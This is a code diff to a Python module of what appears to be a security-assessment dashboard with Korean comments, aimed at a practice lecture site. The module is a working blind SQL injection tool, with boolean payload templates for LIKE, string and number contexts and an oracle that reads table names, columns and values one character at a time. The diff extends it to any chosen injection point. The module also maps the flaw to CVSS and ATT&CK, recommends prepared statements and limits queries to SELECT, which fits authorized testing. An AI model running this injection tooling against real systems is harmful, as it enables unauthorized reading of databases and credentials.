@@ -15,7 +15,7 @@ from urllib.parse import quote
 
 from dashboard.blind import Oracle
 from dashboard.core import Finding, ToolResult, fetch, run_cache
-from dashboard.payloads import DBMS, DBMS_OPTIONS, ensure_select_only
+from dashboard.payloads import DBMS, DBMS_OPTIONS, POINT_PARAMS, ensure_select_only, picked, with_value
 
 META = {
     "id": "sesacedu_lecture_sqli",
@@ -27,6 +27,7 @@ META = {
     "kind": "active",
     "roles": ["user_web", "practice"],  # 이 역할의 대상에서만 보인다
     "stage": "tool",
+    "takes_point": True,  # 팝업에서 SQL 주입 점검으로 취약이 나온 지점을 고르면 그 자리에 때린다(11-20)
     "severity": "critical",
     # 로그인 없이 네트워크에서, DB 내용이 읽힌다(쓰기·중단은 아님)
     "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
@@ -34,7 +35,7 @@ META = {
         {"tactic": "TA0009", "technique": "T1005", "name": "Data from Local System"},
         {"tactic": "TA0006", "technique": "T1552", "name": "Unsecured Credentials"},
     ],
-    "description": "**심화** — SQL 주입 점검(지점)에서 /backend/lectures 의 keyword 가 취약으로 나온 뒤 씁니다. "
+    "description": "**심화** — SQL 주입 점검에서 취약으로 나온 **지점을 고르면 그 자리에**, 안 고르면 강의 목록 검색(keyword)에 때립니다. "
                    "테이블 목록부터 컬럼·값까지 눌러 들어가며 읽습니다. 참·거짓 차이로 한 글자씩 읽어서 느립니다.",
     "params": [
         {"name": "mode", "need": "required", "label": "무엇을 볼지", "type": "select", "default": "probe",
@@ -53,6 +54,12 @@ META = {
         {"name": "limit", "need": "optional", "label": "한 번에 몇 개", "type": "int", "default": "5",
          "help": "한 글자마다 요청이 여러 번 나갑니다. 5개면 대략 300~500번."},
         {"name": "offset", "need": "optional", "label": "앞에서 건너뛸 개수", "type": "int", "default": "0"},
+        {"name": "context", "need": "optional", "label": "값이 들어가는 자리", "type": "select", "default": "like",
+         "options": [{"value": "like", "label": "LIKE 검색 ('%…%' — 강의 목록 검색)"},
+                     {"value": "string", "label": "문자열 ('…')"},
+                     {"value": "number", "label": "숫자"}],
+         "help": "지점을 골랐을 때 씁니다. SQL 주입 점검 근거의 '② 기본 · 문자열/숫자 자리' 를 보고 고릅니다."},
+        *POINT_PARAMS,
     ],
 }
 
@@ -62,24 +69,49 @@ API = "/backend/lectures"
 KEYWORD = "%' OR ({cond}) AND 'a' LIKE 'a"
 
 
-def _count_with(target):
-    """조건을 실어 보내고 강의 건수를 돌려주는 함수."""
+CONTEXT = {"like": KEYWORD, "string": "{v}' AND ({cond}) AND 'q'='q", "number": "{v} AND ({cond})"}
+
+
+def _where(target, params):
+    """(설명, 조건 → 보낼 주소) — 고른 지점이 있으면 그 자리, 없으면 강의 목록 검색."""
+    pt = picked(params)
+    if not pt:
+        return f"{target.url}{API} (query: keyword)", \
+            lambda cond: f"{target.url}{API}?size=1&keyword={quote(KEYWORD.format(cond=cond), safe='')}"
+    url, name, _place, sample = pt
+    tpl = CONTEXT.get(params.get("context") or "like", KEYWORD)
+    return f"{url} (query: {name})", \
+        lambda cond: with_value(url, name, quote(tpl.format(cond=cond, v=sample or "a"), safe=""))
+
+
+def _count_with(target, params=None):
+    """조건을 실어 보내고 '답' 을 돌려주는 함수. 강의 목록은 건수, 다른 지점은 응답의 (상태, 길이)."""
+    _desc, make = _where(target, params or {})
+
     def count(cond):
-        keyword = quote(KEYWORD.format(cond=cond), safe="")
-        r = fetch(f"{target.url}{API}?size=1&keyword={keyword}")
+        r = fetch(make(cond))
         try:
             return json.loads(r.body)["page"]["total"]
-        except Exception as e:  # noqa: BLE001
-            raise RuntimeError(f"건수를 읽지 못했습니다(응답 {r.status}): {e}") from e
+        except Exception:  # noqa: BLE001 — 건수가 없는 지점은 응답 모양으로 가른다
+            if not r.status:
+                raise RuntimeError("응답을 받지 못했습니다")
+            return (r.status, len(r.body))
     return count
 
 
-def _open(target, dbms):
+def _near(c, yes, no):
+    """응답 모양(상태, 길이)이 참·거짓 중 어느 쪽에 가까운지. 상태가 같은 쪽 중 길이가 가까운 쪽."""
+    def gap(x):
+        return (x[0] != c[0], abs(x[1] - c[1]))
+    return gap(yes) <= gap(no)
+
+
+def _open(target, dbms, params=None):
     """참·거짓 기준을 재고 질문 통로를 연다."""
-    count = _count_with(target)
+    count = _count_with(target, params)
     yes, no = count("1=1"), count("1=0")
     if yes == no:
-        raise RuntimeError(f"참·거짓 건수가 {yes}로 같습니다. 주입이 막혔거나 대상이 바뀌었습니다.")
+        raise RuntimeError(f"참·거짓 답이 {yes}로 같습니다. 주입이 막혔거나 자리가 다릅니다('값이 들어가는 자리' 를 바꿔 보세요).")
 
     def ask(cond):
         c = count(cond)
@@ -87,7 +119,9 @@ def _open(target, dbms):
             return True
         if c == no:
             return False
-        raise RuntimeError(f"예상 밖 건수 {c} (조건: {cond[:60]})")
+        if isinstance(c, tuple) and isinstance(yes, tuple):
+            return _near(c, yes, no)
+        raise RuntimeError(f"예상 밖 답 {c} (조건: {cond[:60]})")
 
     return Oracle(ask, dbms=dbms, cache=run_cache())
 
@@ -111,21 +145,21 @@ def run(target, params):
     offset = max(0, int(params.get("offset") or 0))
     base = {"dbms": dbms, "limit": str(limit)}
 
+    where, _make = _where(target, params)
     if mode == "probe":
-        count = _count_with(target)
+        count = _count_with(target, params)
         yes, no = count("1=1"), count("1=0")
         ok = yes != no
         return ToolResult(
-            summary="주입됩니다 — 참·거짓 건수가 다릅니다" if ok else "주입되지 않습니다 — 건수가 같습니다",
-            columns=["보낸 조건", "강의 건수"], rows=[["1=1 (참)", yes], ["1=0 (거짓)", no]],
+            summary=("주입됩니다 — 참·거짓 답이 다릅니다" if ok else "주입되지 않습니다 — 답이 같습니다") + f" · {where}",
+            columns=["보낸 조건", "답(건수 또는 상태·길이)"], rows=[["1=1 (참)", yes], ["1=0 (거짓)", no]],
             drills=[{"테이블 목록 보기": {**base, "mode": "tables", "offset": "0"}}, None] if ok else [],
             findings=[Finding(
-                title="강의 목록 검색어에 SQL 주입",
+                title="강의 목록 검색어에 SQL 주입" if not picked(params) else f"SQL 주입 — {where}",
                 severity="critical",
-                location=f"{target.url}{API} (query: keyword)",
-                evidence=f"keyword={KEYWORD.format(cond='1=1')} → {yes}건\n"
-                         f"keyword={KEYWORD.format(cond='1=0')} → {no}건\n"
-                         "조건의 참·거짓에 따라 건수가 달라집니다.",
+                location=where,
+                evidence=f"참 조건(1=1) → {yes}\n거짓 조건(1=0) → {no}\n"
+                         "조건의 참·거짓에 따라 답이 달라집니다.",
                 recommendation="검색어를 문자열로 잇지 말고 바인드 변수(PreparedStatement)로 넘깁니다. "
                                "정렬 기준은 허용 목록에서 고릅니다.")] if ok else [],
             note="요청 2번만 보냅니다. 여기서 확인된 뒤에 ②부터 읽어 나가세요.")
@@ -133,7 +167,7 @@ def run(target, params):
     # 요청을 보내기 전에 먼저 걸러 낸다
     statement = ensure_select_only((params.get("sql") or "").strip() or "SELECT 1") if mode == "sql" else ""
 
-    ora = _open(target, dbms)
+    ora = _open(target, dbms, params)
 
     if mode == "tables":
         names = ora.read_list(sql["tables"], limit, offset, charset="ident")
